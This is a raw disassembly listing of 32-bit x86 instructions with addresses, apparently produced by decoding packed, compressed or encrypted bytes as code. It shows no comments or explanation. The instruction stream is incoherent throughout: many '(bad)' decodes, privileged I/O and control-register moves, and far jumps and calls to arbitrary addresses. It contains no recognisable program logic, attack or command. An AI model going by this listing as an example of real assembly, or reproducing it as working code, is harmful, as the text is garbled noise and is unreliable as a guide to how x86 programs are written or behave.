  419e06:	pushf  
  419e07:	mov    edx,0xdd2e3cb
  419e0c:	sub    bh,BYTE PTR [edi]
  419e0e:	xchg   esi,eax
  419e0f:	hlt    
  419e10:	jb     0x419ddf
  419e12:	mov    dl,0x1a
  419e14:	sbb    BYTE PTR [ebx],dh
  419e16:	sub    al,0x88
  419e18:	ret    0x54c1
  419e1b:	jecxz  0x419de0
  419e1d:	arpl   WORD PTR [ecx+0x25fc315e],si
  419e23:	and    BYTE PTR [eax],bl
  419e25:	pop    esi
  419e26:	jnp    0x419ddd
  419e28:	out    0xda,eax
  419e2a:	jle    0x419e86
  419e2c:	retf   0x5ad5
  419e2f:	dec    eax
  419e30:	rol    BYTE PTR [ebp+0xb],1
  419e33:	xlat   BYTE PTR ds:[ebx]
  419e34:	xor    ah,ah
  419e36:	or     cl,ah
  419e38:	mov    esp,0x7acc8f79
  419e3d:	sub    eax,0x50617db1
  419e42:	mov    WORD PTR es:[edi+0x6c],cs
  419e46:	stc    
  419e47:	rcl    BYTE PTR [ecx],1
  419e49:	js     0x419e33
  419e4b:	lods   eax,DWORD PTR ds:[esi]
  419e4c:	pop    es
  419e4d:	retf   
  419e4e:	in     al,0xd7
  419e50:	sbb    BYTE PTR [esi],0xa7
  419e53:	add    dh,bl
  419e55:	in     al,0x73
  419e57:	outs   dx,BYTE PTR ds:[esi]
  419e58:	dec    esi
  419e59:	xchg   BYTE PTR [ebx+esi*2],ah
  419e5c:	fstp   DWORD PTR [esi]
  419e5e:	and    edx,ecx
  419e60:	les    esp,FWORD PTR [esi-0x3bee43ef]
  419e66:	int    0xca
  419e68:	gs or  eax,0x5bdeb1f0
  419e6e:	mov    eax,0xfffe18d1
  419e73:	addr16 pop edi
  419e75:	rcl    BYTE PTR [ebx-0x74],0xfb
  419e79:	jmp    0x352d:0x37ecb8ae
  419e80:	adc    eax,DWORD PTR [ebx]
  419e82:	xor    BYTE PTR [ebp-0x2a],ch
  419e85:	in     al,0x3f
  419e87:	lds    ebp,FWORD PTR [eax-0x50d28527]
  419e8d:	adc    ah,cl
  419e8f:	outs   dx,BYTE PTR ds:[esi]
  419e90:	push   ecx
  419e91:	dec    ebx
  419e92:	xchg   esi,eax
  419e93:	sub    al,0x7c
  419e95:	pop    ds
  419e96:	fidivr WORD PTR [ebp-0x4e4e44c5]
  419e9c:	int    0x3b
  419e9e:	cmp    dl,BYTE PTR [ecx-0x30]
  419ea1:	aas    
  419ea2:	inc    edi
  419ea3:	mov    ebx,0x94b489c5
  419ea8:	daa    
  419ea9:	xor    BYTE PTR [esi+0xd],ah
  419eac:	into   
  419ead:	push   ebp
  419eae:	adc    ch,bl
  419eb0:	and    DWORD PTR [eax+0x13],ecx
  419eb3:	jbe    0x419e64
  419eb5:	std    
  419eb6:	sti    
  419eb7:	xchg   ebx,eax
  419eb8:	loope  0x419f39
  419eba:	sbb    al,dl
  419ebc:	mov    ds:0xa8351526,al
  419ec1:	xor    edi,DWORD PTR [ebx+0x66c7ae3f]
  419ec7:	inc    ebx
  419ec8:	iret   
  419ec9:	fsubr  QWORD PTR ds:0xf903aac4
  419ecf:	mov    dl,0xd4
  419ed1:	lods   al,BYTE PTR ds:[esi]
  419ed2:	inc    edx
  419ed3:	in     al,dx
  419ed4:	fld    QWORD PTR cs:[ecx-0x4a]
  419ed8:	cmp    al,0x6c
  419eda:	xadd   ch,al
  419edd:	add    dh,BYTE PTR [eax+0x1f]
  419ee0:	dec    edi
  419ee1:	lods   al,BYTE PTR ds:[esi]
  419ee2:	dec    esi
  419ee3:	jnp    0x419e7a
  419ee5:	sbb    ebx,DWORD PTR [edx+0x44]
  419ee8:	mov    ds:0x91f5c2aa,al
	...
  419f55:	add    BYTE PTR [edi+0x5fc517d8],al
  419f5b:	iret   
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	add    eax,0x2723897b
  419f67:	pop    ss
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	inc    DWORD PTR [eax]
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	inc    esi
  419f6f:	push   edx
  419f70:	pop    ds
  419f71:	xor    BYTE PTR [edx-0x1c57b324],al
  419f77:	inc    DWORD PTR [edi]
  419f79:	push   esi
  419f7a:	cmp    BYTE PTR [edx],cl
  419f7c:	int    0xb5
  419f7e:	add    esp,ebp
  419f80:	jo     0x419f3e
  419f82:	not    BYTE PTR [edi+0x5b]
  419f85:	mov    bh,0x16
  419f87:	xchg   ecx,eax
  419f88:	bnd ja 0x419f46
  419f8b:	xlat   BYTE PTR ds:[ebx]
  419f8c:	jecxz  0x419f36
  419f8e:	lods   al,BYTE PTR ds:[esi]
  419f8f:	out    dx,eax
  419f90:	cmp    esp,ecx
  419f92:	imul   esp,DWORD PTR [esi+0x3bddc400],0xcbcabfb2
  419f9c:	lahf   
  419f9d:	lods   al,BYTE PTR ds:[esi]
  419f9e:	cli    
  419f9f:	dec    esp
  419fa0:	in     al,0xb4
  419fa2:	mov    ds:0xd31b6edb,eax
  419fa7:	clc    
  419fa8:	xchg   DWORD PTR [esi],ebx
  419faa:	sub    BYTE PTR [eax-0x2],bh
  419fad:	cmp    eax,DWORD PTR [ebp-0x43]
  419fb0:	adc    eax,0xbd3b379b
  419fb5:	dec    ebp
  419fb6:	add    bl,BYTE PTR [ebx]
  419fb8:	mov    esp,0x60f097eb
  419fbd:	xor    esi,DWORD PTR [eax-0x48]
  419fc0:	loop   0x419f93
  419fc2:	adc    dl,BYTE PTR [eax]
  419fc4:	add    ebp,DWORD PTR [esi]
  419fc6:	pop    ecx
  419fc7:	add    edx,ecx
  419fc9:	jmp    0x5b7be475
  419fce:	dec    ecx
  419fcf:	xchg   ch,dh
  419fd1:	xor    BYTE PTR [esi+ebp*8-0x12],dl
  419fd5:	lds    edi,FWORD PTR [ecx-0x42]
  419fd8:	jp     0x419fc3
  419fda:	sub    eax,0xd0641f21
  419fdf:	lods   al,BYTE PTR ds:[esi]
  419fe0:	popf   
  419fe1:	das    
  419fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fe3:	scas   al,BYTE PTR es:[edi]
  419fe4:	pop    es
  419fe5:	(bad)  
  419fe6:	xor    DWORD PTR [ebp+0x3e7f2d3f],edx
  419fec:	mov    dh,0xdc
  419fee:	jmp    0xf7e9a67f
  419ff3:	mov    ds:0x85058d22,al
  419ff8:	clc    
  419ff9:	pop    es
  419ffa:	int3   
  419ffb:	addr16 push edi
  419ffd:	fmul   QWORD PTR [edi-0x10]
  41a000:	jecxz  0x419f96
  41a002:	xchg   ecx,eax
  41a003:	pop    ds
  41a004:	fucomp st(5)
  41a007:	mov    BYTE PTR [edx+0x7e],al
  41a00a:	push   ebx
  41a00b:	mov    ds:0xd3f5e92d,eax
  41a010:	sbb    bh,BYTE PTR [edx+0x15]
  41a013:	and    ch,ch
  41a015:	les    esp,FWORD PTR [ebx-0x3cd55469]
  41a01b:	jmp    0x419fd2
  41a01d:	and    edi,DWORD PTR [edi+0x49]
  41a020:	mov    ebp,0x15b9f160
  41a025:	sub    al,0x17
  41a027:	ret    0x6ce0
  41a02a:	mov    cl,0xec
  41a02c:	push   es
  41a02d:	mov    DWORD PTR [esi-0x64],edi
  41a030:	(bad)  
  41a031:	mov    ds:0xb1344f4a,eax
  41a036:	loopne 0x41a099
  41a038:	out    0xd2,eax
  41a03a:	repz xchg ecx,eax
  41a03c:	into   
  41a03d:	sbb    eax,0xc5aad9f
  41a042:	leave  
  41a043:	jmp    0x419ff8
  41a045:	in     al,0x72
  41a047:	mov    eax,ds:0x2219218
  41a04c:	mov    esp,0xef645385
  41a051:	popf   
  41a052:	psllq  mm4,QWORD PTR [edi]
  41a055:	inc    ebx
  41a056:	push   edx
  41a057:	push   esp
  41a058:	pop    esi
  41a059:	push   esp
  41a05a:	iret   
  41a05b:	push   edx
  41a05c:	and    dl,BYTE PTR [eax]
  41a05e:	jns    0x41a05f
  41a060:	sti    
  41a061:	sbb    al,0x89
  41a063:	in     eax,dx
  41a064:	ret    0x9f66
  41a067:	outs   dx,BYTE PTR ds:[esi]
  41a068:	loop   0x419feb
  41a06a:	jne    0x41a0de
  41a06c:	xchg   esp,eax
	...
  41a0d5:	add    BYTE PTR [esi-0x15],cl
  41a0d8:	sub    cl,BYTE PTR [esi-0x51]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax-0x39],bh
  41a0e3:	add    al,0xd7
  41a0e5:	dec    edi
  41a0e6:	sbb    BYTE PTR es:[ecx],al
  41a0e9:	add    bh,bh
  41a0eb:	add    BYTE PTR [eax],al
  41a0ed:	add    BYTE PTR [esi-0x3a5802e7],bl
  41a0f3:	cld    
  41a0f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0f5:	jbe    0x41a132
  41a0f7:	xlat   BYTE PTR ds:[ebx]
  41a0f8:	dec    eax
  41a0f9:	es mov es,edi
  41a0fc:	push   es
  41a0fd:	loop   0x41a0fb
  41a0ff:	test   ebx,esi
  41a101:	dec    edx
  41a102:	sbb    ebp,DWORD PTR [eax+0x162ab1d5]
  41a108:	stos   DWORD PTR es:[edi],eax
  41a109:	cdq    
  41a10a:	sub    dl,BYTE PTR ds:0xd43eb525
  41a110:	pushf  
  41a111:	imul   eax,DWORD PTR [ebp-0x7b]
  41a115:	cmp    bh,ch
  41a117:	rol    BYTE PTR [edx],cl
  41a119:	outs   dx,BYTE PTR ds:[esi]
  41a11a:	jecxz  0x41a180
  41a11c:	retf   
  41a11d:	mov    bl,0x8d
  41a11f:	xor    DWORD PTR [eax+0x7eac7306],edi
  41a125:	loop   0x41a10f
  41a127:	in     eax,dx
  41a128:	jge    0x41a12c
  41a12a:	lahf   
  41a12b:	push   edi
  41a12c:	ror    BYTE PTR [esi+0x24464fd2],0x35
  41a133:	mov    bl,0xac
  41a136:	sub    al,0xb3
  41a138:	fnsave [ebx]
  41a13a:	sub    DWORD PTR [esi+0x25],0xbab7b6f1
  41a141:	repnz xor eax,0x8e441c6f
  41a147:	xor    eax,0xdd53d22d
  41a14c:	pop    es
  41a14d:	push   edx
  41a14e:	stc    
  41a14f:	jg     0x41a191
  41a151:	fidiv  DWORD PTR [eax+eiz*2+0x35]
  41a155:	pop    ss
  41a156:	jb     0x41a0ea
  41a158:	call   0xd136cdb8
  41a15d:	push   ebx
  41a15e:	xchg   edx,eax
  41a15f:	pop    ebp
  41a160:	pop    eax
  41a161:	and    DWORD PTR [bp+si-0x48],esi
  41a165:	pop    esp
  41a166:	into   
  41a167:	loop   0x41a197
  41a169:	or     ch,bh
  41a16b:	mov    esi,0x40def462
  41a170:	xchg   edx,eax
  41a171:	test   BYTE PTR ds:0xe6245d7d,dl
  41a177:	std    
  41a178:	xor    esp,DWORD PTR [edx-0x12a174ad]
  41a17e:	jns    0x41a176
  41a180:	xchg   ebp,eax
  41a181:	call   0xbc28:0x141d4ef0
  41a188:	pop    edi
  41a189:	mov    bl,0xf7
  41a18b:	or     DWORD PTR [ecx+0xe1f2d7c],ecx
  41a191:	repz jnp 0x41a190
  41a194:	ins    DWORD PTR es:[edi],dx
  41a195:	in     al,dx
  41a196:	or     eax,0x2980fcba
  41a19b:	adc    BYTE PTR [esi+0x1a],dl
  41a19e:	rcl    BYTE PTR [edi+0x414104ce],0x47
  41a1a5:	dec    ebx
  41a1a6:	pop    esp
  41a1a7:	push   ebx
  41a1a8:	xchg   DWORD PTR [ebp*4+0x29524939],eax
  41a1af:	lds    esi,FWORD PTR [esi+0x637ead5a]
  41a1b5:	mov    ebx,0x72d61e14
  41a1ba:	mov    ecx,0x6a5dda5
  41a1bf:	ret    0x7983
  41a1c2:	push   cs
  41a1c3:	or     BYTE PTR [esi],dl
  41a1c5:	xchg   ecx,eax
  41a1c6:	xchg   edi,eax
  41a1c7:	cwde   
  41a1c8:	loope  0x41a1c4
  41a1ca:	push   esp
  41a1cb:	cmp    eax,0x991a3a94
  41a1d0:	mov    ebx,esp
  41a1d2:	and    edi,ecx
  41a1d4:	mov    ch,0xf7
  41a1d6:	(bad)  
  41a1d7:	enter  0xe680,0x2
  41a1db:	imul   ecx,esp,0xfffffff0
  41a1de:	call   0x3b5b4f1c
  41a1e3:	or     bh,bh
  41a1e5:	dec    edi
  41a1e6:	imul   edi,esi,0xe6836b82
  41a1ec:	fadd   DWORD PTR [eax]
	...
  41a256:	sbb    al,0xc
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	mov    ecx,0x251e77c6
  41a267:	sbb    DWORD PTR [ecx],eax
  41a269:	add    bh,bh
  41a26b:	add    BYTE PTR [eax],al
  41a26d:	add    BYTE PTR [esi+0x79042542],bl
  41a273:	outs   dx,BYTE PTR ds:[esi]
  41a274:	ja     0x41a280
  41a276:	loope  0x41a2d3
  41a278:	jp     0x41a2b9
  41a27a:	mov    eax,ds:0xdada4b1c
  41a27f:	ja     0x41a2de
  41a281:	sahf   
  41a282:	out    0x67,al
  41a284:	inc    edi
  41a285:	(bad)  
  41a287:	jl     0x41a27b
  41a289:	jae    0x41a242
  41a28b:	xlat   BYTE PTR ds:[ebx]
  41a28c:	push   ebx
  41a28d:	xchg   esp,eax
  41a28e:	mov    bl,0x43
  41a290:	sti    
  41a291:	dec    edi
  41a292:	sbb    BYTE PTR gs:[edx-0x20],dl
  41a296:	cdq    
  41a297:	jbe    0x41a269
  41a299:	pop    edx
  41a29a:	sbb    DWORD PTR [esi+0x4f],esp
  41a29d:	rol    DWORD PTR [esi],0xb5
  41a2a0:	ins    DWORD PTR es:[edi],dx
  41a2a1:	mov    dl,0xad
  41a2a3:	add    eax,0x7fc23927
  41a2a8:	out    dx,al
  41a2a9:	add    eax,DWORD PTR [ecx-0x482961e]
  41a2af:	stos   BYTE PTR es:[edi],al
  41a2b0:	test   al,0xc0
  41a2b2:	fisttp WORD PTR [ebp+0x11]
  41a2b5:	sbb    al,0x43
  41a2b7:	push   0xffffff88
  41a2b9:	imul   DWORD PTR [edx+ebp*2]
  41a2bc:	mov    dl,0x7
  41a2be:	sbb    eax,0x222d4de1
  41a2c3:	scas   al,BYTE PTR es:[edi]
  41a2c4:	jb     0x41a295
  41a2c6:	inc    ebp
  41a2c7:	hlt    
  41a2c8:	gs xchg esp,eax
  41a2ca:	test   eax,0x1f777e1f
  41a2cf:	cld    
  41a2d0:	lods   al,BYTE PTR ds:[esi]
  41a2d1:	fidivr DWORD PTR ds:0x80c07f57
  41a2d7:	or     eax,DWORD PTR ds:0xc2c6ad99
  41a2dd:	out    dx,eax
  41a2de:	in     al,dx
  41a2df:	ja     0x41a26d
  41a2e1:	pop    ds
  41a2e2:	or     eax,0x1f768563
  41a2e7:	and    cl,BYTE PTR [edi-0x4e9234bb]
  41a2ed:	gs push esp
  41a2ef:	fimul  DWORD PTR [ecx+0x4477dce8]
  41a2f5:	out    0x25,eax
  41a2f7:	mov    al,0x91
  41a2f9:	jg     0x41a2f0
  41a2fb:	shl    DWORD PTR [ecx],cl
  41a2fd:	mov    cl,0x23
  41a2ff:	fcomp  DWORD PTR [edi-0x6535f91a]
  41a305:	sbb    ebp,edx
  41a307:	out    0x58,eax
  41a309:	push   si
  41a30b:	sub    ebx,DWORD PTR [esi-0x34]
  41a30e:	retf   0xcdd
  41a311:	mov    bl,0x33
  41a313:	mov    ah,0xc9
  41a315:	call   0xc402ed75
  41a31a:	repz xchg esi,eax
  41a31c:	dec    ebp
  41a31d:	and    al,0xa4
  41a31f:	mov    ebp,ebx
  41a321:	fld    QWORD PTR [ebp-0x2]
  41a324:	jnp    0x41a358
  41a326:	cmc    
  41a327:	mov    esp,0xc1f4545d
  41a32c:	shl    BYTE PTR [edx+ecx*1+0xb],cl
  41a330:	dec    eax
  41a331:	(bad)  
  41a332:	arpl   cx,cx
  41a334:	cmp    BYTE PTR [edi],al
  41a336:	jg     0x41a2e0
  41a338:	add    al,0x33
  41a33a:	ret    
  41a33b:	xchg   esp,eax
  41a33c:	cmp    DWORD PTR [edi-0x706ab7fe],ebp
  41a342:	jno    0x41a312
  41a344:	popa   
  41a345:	push   cs
  41a346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a347:	cdq    
  41a348:	add    bh,BYTE PTR [eax+0x69]
  41a34b:	retf   
  41a34c:	and    eax,0xf9354ba7
  41a351:	fisub  WORD PTR [esi+0x45]
  41a354:	cmp    ecx,edx
  41a356:	dec    ecx
  41a357:	add    eax,0x722a82ec
  41a35c:	adc    ecx,edi
  41a35e:	and    esi,DWORD PTR [edx]
  41a360:	or     cl,dh
  41a362:	mov    dl,0x92
  41a364:	mov    WORD PTR [ebp-0xe],ss
  41a367:	add    eax,0x460a04f0
  41a36c:	rol    BYTE PTR [eax],0x0
	...
  41a3d3:	add    BYTE PTR [eax],al
  41a3d5:	add    bh,dh
  41a3d7:	pop    eax
  41a3d8:	test   al,0x13
  41a3da:	scas   eax,DWORD PTR es:[edi]
  41a3db:	repz (bad) 
  41a3dd:	cld    
  41a3de:	adc    eax,0x73a6955c
  41a3e3:	sbb    edi,DWORD PTR [edx-0xc]
  41a3e6:	and    al,0x1a
  41a3e8:	add    DWORD PTR [eax],eax
  41a3ea:	inc    DWORD PTR [eax]
  41a3ec:	add    BYTE PTR [eax],al
  41a3ee:	dec    BYTE PTR [edi-0x78c7fc21]
  41a3f4:	lods   al,BYTE PTR ds:[esi]
  41a3f5:	sbb    ah,BYTE PTR [ebx+esi*8]
  41a3f8:	cld    
  41a3f9:	aam    0x90
  41a3fb:	test   ecx,0x3b7bac3a
  41a401:	popa   
  41a402:	(bad)  [ebx]
  41a404:	push   edi
  41a405:	or     bl,ah
  41a407:	dec    esp
  41a408:	mov    edi,0xc0f7d16
  41a40d:	cli    
  41a40e:	out    dx,al
  41a40f:	add    al,0x53
  41a411:	inc    ecx
  41a412:	cmp    dh,BYTE PTR [edi-0x62]
  41a415:	(bad)  [ebx]
  41a417:	(bad)  
  41a418:	loope  0x41a45b
  41a41a:	clc    
  41a41b:	test   al,0x35
  41a41e:	scas   eax,DWORD PTR es:[edi]
  41a41f:	xchg   ebp,eax
  41a420:	or     eax,0xcc190f8b
  41a425:	scas   eax,DWORD PTR es:[edi]
  41a426:	mov    dl,0x30
  41a429:	add    al,0x11
  41a42b:	push   ecx
  41a42c:	pop    esp
  41a42d:	aas    
  41a42e:	(bad)  
  41a42f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a430:	inc    esp
  41a431:	or     edx,DWORD PTR [edx]
  41a433:	daa    
  41a434:	mov    edi,0x2f2a2408
  41a439:	jne    0x41a427
  41a43b:	and    eax,0x7c3907e8
  41a440:	push   edi
  41a441:	fidivr WORD PTR [edx+0x68]
  41a444:	shl    BYTE PTR [eax-0x1a],0x5b
  41a448:	arpl   WORD PTR [edi-0x11],ax
  41a44b:	inc    eax
  41a44c:	(bad)  
  41a44d:	or     al,0x39
  41a44f:	xchg   DWORD PTR [ebp+0xf],eax
  41a452:	xchg   esi,eax
  41a453:	mov    ebx,0x21cdc429
  41a458:	(bad)  
  41a459:	pop    ecx
  41a45a:	sbb    BYTE PTR [edx-0x6d],ah
  41a45d:	test   al,0x43
  41a45f:	cmp    eax,0x7986046b
  41a464:	cld    
  41a465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a466:	icebp  
  41a467:	inc    ebp
  41a468:	loopne 0x41a4b0
  41a46a:	dec    esp
  41a46b:	or     DWORD PTR [ecx],edx
  41a46d:	dec    ebp
  41a46e:	(bad)  
  41a470:	push   edx
  41a471:	dec    esp
  41a472:	or     eax,0x94bad9aa
  41a477:	repz push esi
  41a479:	and    edi,DWORD PTR [esi]
  41a47b:	or     eax,0x6f021b82
  41a480:	in     al,0x4f
  41a482:	mov    gs,WORD PTR [ecx+0x19]
  41a485:	cmp    ebx,DWORD PTR [eax]
  41a487:	lock xchg esi,eax
  41a489:	or     ecx,DWORD PTR [esi]
  41a48b:	into   
  41a48c:	or     bl,BYTE PTR [edi-0x1d9a8070]
  41a492:	ins    BYTE PTR es:[edi],dx
  41a493:	addr16 hlt 
  41a495:	out    dx,al
  41a496:	and    al,0xd5
  41a498:	mov    eax,DWORD PTR [ebp+0x15]
  41a49b:	mov    ecx,DWORD PTR [eax+0x38]
  41a49e:	xchg   edi,ebp
  41a4a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4a1:	daa    
  41a4a2:	xor    DWORD PTR [ecx+0x2a],edi
  41a4a5:	popf   
  41a4a6:	sub    al,0xc
  41a4a8:	adc    BYTE PTR [eax+eiz*2+0x719c6a24],dl
  41a4af:	adc    esi,edx
  41a4b1:	int    0x32
  41a4b3:	add    ebx,edx
  41a4b5:	out    dx,eax
  41a4b6:	mov    ebp,0x45f185fb
  41a4bb:	scas   eax,DWORD PTR es:[edi]
  41a4bc:	mov    ebx,0xbf192fe0
  41a4c1:	sbb    ah,dh
  41a4c3:	daa    
  41a4c4:	pushf  
  41a4c5:	popf   
  41a4c6:	mov    eax,ss
  41a4c8:	shl    BYTE PTR [eax-0x931b2a7],0x26
  41a4cf:	bound  ebx,QWORD PTR [ebx+0x0]
  41a4d2:	dec    ecx
  41a4d3:	dec    eax
  41a4d4:	fadd   st(2),st
  41a4d6:	sbb    ecx,DWORD PTR [ebx]
  41a4d8:	(bad)  
  41a4d9:	aam    0xd
  41a4db:	stos   DWORD PTR es:[edi],eax
  41a4dc:	ret    
  41a4dd:	and    ah,BYTE PTR [ebp-0x16957e28]
  41a4e3:	jmp    0x3c3e:0x66f4ed9a
  41a4ea:	or     al,0xb2
  41a4ec:	stos   BYTE PTR es:[edi],al
	...
  41a555:	add    BYTE PTR [edi-0xf0307e],bh
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	in     eax,0x54
  41a564:	xchg   ebx,eax
  41a565:	inc    esi
  41a566:	and    ebx,DWORD PTR [ebx]
  41a568:	add    DWORD PTR [eax],eax
  41a56a:	inc    DWORD PTR [eax]
  41a56c:	add    BYTE PTR [eax],al
  41a56e:	outs   dx,DWORD PTR ds:[esi]
  41a56f:	pop    edx
  41a570:	rol    DWORD PTR [ecx],0x5e
  41a573:	push   esp
  41a574:	adc    BYTE PTR [eax-0x77],0x49
  41a578:	push   esi
  41a579:	sar    BYTE PTR [eax+0x5ac52ee8],cl
  41a57f:	icebp  
  41a580:	inc    ecx
  41a581:	inc    esp
  41a582:	fsub   DWORD PTR [esi-0x40]
  41a585:	retf   
  41a586:	mov    ds:0x4012c871,al
  41a58b:	fwait
  41a58c:	mul    DWORD PTR [edi+0x1f096fdd]
  41a592:	adc    ebx,ebp
  41a594:	pop    edi
  41a596:	out    0x46,al
  41a598:	cmp    ecx,ebx
  41a59a:	test   DWORD PTR [eax],ebx
  41a59c:	das    
  41a59d:	loopne 0x41a57b
  41a59f:	(bad)  
  41a5a0:	cli    
  41a5a1:	xchg   edx,eax
  41a5a2:	mov    ecx,ebx
  41a5a4:	inc    esi
  41a5a5:	icebp  
  41a5a6:	and    BYTE PTR [edx+0x65],ah
  41a5a9:	jae    0x41a5c5
  41a5ab:	test   DWORD PTR [ebx-0x46755734],0xccbe326c
  41a5b5:	sti    
  41a5b6:	xchg   ebx,eax
  41a5b7:	add    ch,bh
  41a5b9:	mov    ebx,esi
  41a5bb:	and    al,0xaf
  41a5bd:	iret   
  41a5be:	push   ebp
  41a5bf:	push   edi
  41a5c0:	inc    esp
  41a5c1:	(bad)  
  41a5c2:	lahf   
  41a5c3:	scas   al,BYTE PTR es:[edi]
  41a5c4:	lahf   
  41a5c5:	call   0x2731e640
  41a5ca:	pop    edx
  41a5cb:	push   ecx
  41a5cc:	mov    ebp,0xed2a6d56
  41a5d1:	xchg   esp,eax
  41a5d2:	fnstcw WORD PTR [ebp-0x25]
  41a5d5:	es out dx,al
  41a5d7:	enter  0x59aa,0x94
  41a5db:	cmp    BYTE PTR [ebp-0x634c1974],dh
  41a5e1:	shl    DWORD PTR [eax+0x3cd5ee2f],1
  41a5e7:	pop    ebp
  41a5e8:	sub    eax,0x3da9ded
  41a5ed:	js     0x41a660
  41a5ef:	sub    eax,0xf31ec0f4
  41a5f4:	pop    ebp
  41a5f6:	in     al,0x79
  41a5f8:	jp     0x41a651
  41a5fa:	sbb    BYTE PTR [ebx-0x68],dh
  41a5fd:	sbb    bh,BYTE PTR [esp]
  41a600:	sbb    eax,0x4c5555ec
  41a605:	and    ah,0x51
  41a608:	outs   dx,DWORD PTR ds:[esi]
  41a609:	out    0x93,al
  41a60b:	push   0x55
  41a60d:	mov    ebp,0xcdd2fd14
  41a612:	mov    WORD PTR [esi+0x3a],ss
  41a615:	mov    ds:0xa17719c,eax
  41a61a:	mov    al,0x64
  41a61c:	inc    ebp
  41a61d:	push   edx
  41a61e:	mov    cl,BYTE PTR [ebx]
  41a620:	xchg   edx,eax
  41a621:	xor    BYTE PTR [ebx-0x3e],ah
  41a624:	add    DWORD PTR ds:0xdfeb562b,esi
  41a62a:	fidivr WORD PTR [esp+ecx*8-0x6f]
  41a62e:	lods   al,BYTE PTR ds:[esi]
  41a62f:	jmp    0x3e62:0x5ea55afa
  41a636:	adc    dh,BYTE PTR [esi-0x24]
  41a639:	mov    ch,0x59
  41a63b:	jmp    0x2c64:0xe30d4b51
  41a642:	pop    ebp
  41a643:	dec    eax
  41a644:	retf   0x4c6a
  41a647:	push   ebp
  41a648:	ficom  WORD PTR [eax-0x17]
  41a64b:	gs pop edi
  41a64d:	pushf  
  41a64e:	xor    BYTE PTR [edx+eiz*1+0xbc163b],al
  41a655:	mov    al,ds:0x9b84a6ee
  41a65a:	push   esp
  41a65b:	loopne 0x41a5e1
  41a65d:	add    DWORD PTR [eax],0xa17cb7db
  41a663:	or     ah,0xbb
  41a666:	mov    ch,0x1a
  41a668:	inc    ebp
  41a669:	mov    eax,0x278787
	...
  41a6d6:	pop    esp
  41a6d7:	sub    al,BYTE PTR [ecx]
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0x22e0a625
  41a6e4:	pop    ecx
  41a6e5:	mov    cr3,esp
  41a6e8:	add    DWORD PTR [eax],eax
  41a6ea:	inc    DWORD PTR [eax]
  41a6ec:	add    BYTE PTR [eax],al
  41a6ee:	dec    esp
  41a6ef:	push   es
  41a6f0:	nop
  41a6f1:	pop    esi
  41a6f2:	into   
  41a6f3:	outs   dx,DWORD PTR ds:[esi]
  41a6f4:	or     DWORD PTR [ebx+ecx*8-0x37192b2b],ecx
  41a6fb:	mov    esp,0x800415ea
  41a700:	dec    ecx
  41a701:	call   0x29fc:0x934ae265
  41a708:	inc    eax
  41a709:	test   BYTE PTR [edi+0x78ebeb31],dh
  41a70f:	pop    esi
  41a710:	pop    esp
  41a711:	out    0x28,eax
  41a713:	sbb    al,0xa2
  41a715:	adc    al,0x8a
  41a717:	enter  0x9d37,0x3c
  41a71b:	add    dh,BYTE PTR [esi]
  41a71d:	loope  0x41a755
  41a71f:	adc    edi,DWORD PTR [ebx]
  41a721:	cmc    
  41a722:	fidiv  WORD PTR [ecx]
  41a724:	mov    ebx,0x95c31b6a
  41a729:	and    ch,0xc2
  41a72c:	inc    esp
  41a72d:	jp     0x41a70e
  41a72f:	add    ebp,edi
  41a731:	adc    dl,dh
  41a733:	mov    eax,edi
  41a735:	ins    BYTE PTR es:[edi],dx
  41a736:	sub    BYTE PTR [ebx],dh
  41a738:	hlt    
  41a739:	pusha  
  41a73a:	(bad)  
  41a73c:	imul   BYTE PTR [eax]
  41a73e:	inc    edi
  41a73f:	cmp    ah,cl
  41a741:	jb     0x41a7b6
  41a743:	lods   al,BYTE PTR ds:[esi]
  41a744:	in     eax,0xa3
  41a746:	dec    edx
  41a747:	(bad)  [ebx+0x5d]
  41a74a:	pushf  
  41a74b:	pop    ecx
  41a74c:	(bad)  
  41a74d:	jne    0x41a795
  41a74f:	in     eax,dx
  41a750:	out    0xfe,eax
  41a752:	jecxz  0x41a708
  41a754:	fist   WORD PTR [esi+ebx*1+0x25c8127b]
  41a75b:	mov    bl,0x68
  41a75d:	rcr    DWORD PTR [esi-0x7d],cl
  41a760:	or     BYTE PTR [ebp-0x23],0x2b
  41a764:	mov    dh,0x29
  41a766:	sub    bh,al
  41a768:	idiv   ah
  41a76a:	mov    edi,0x15361e6
  41a76f:	cli    
  41a770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a771:	pop    ebp
  41a772:	mov    DWORD PTR [edx+0x7c],eax
  41a775:	mov    DWORD PTR [ecx-0x2f],edi
  41a778:	fwait
  41a779:	xchg   DWORD PTR es:[esp+esi*2+0x29],ebx
  41a77e:	or     edi,DWORD PTR [ecx]
  41a780:	outs   dx,DWORD PTR ds:[esi]
  41a781:	inc    ecx
  41a782:	adc    DWORD PTR [esi-0x7b7310a0],edx
  41a788:	fcom   DWORD PTR [eax-0x4a60cc61]
  41a78e:	test   eax,0xa9b0beb2
  41a793:	lahf   
  41a794:	rol    BYTE PTR [edx],1
  41a796:	icebp  
  41a797:	pop    es
  41a798:	mov    esp,0x7e5c5606
  41a79d:	js     0x41a7f0
  41a79f:	dec    edi
  41a7a0:	aaa    
  41a7a1:	mov    bl,0xbf
  41a7a3:	sub    dh,BYTE PTR [ecx+0x57e0cda8]
  41a7a9:	imul   ecx,DWORD PTR [ebp+0x40ecccd8],0x2
  41a7b0:	inc    esi
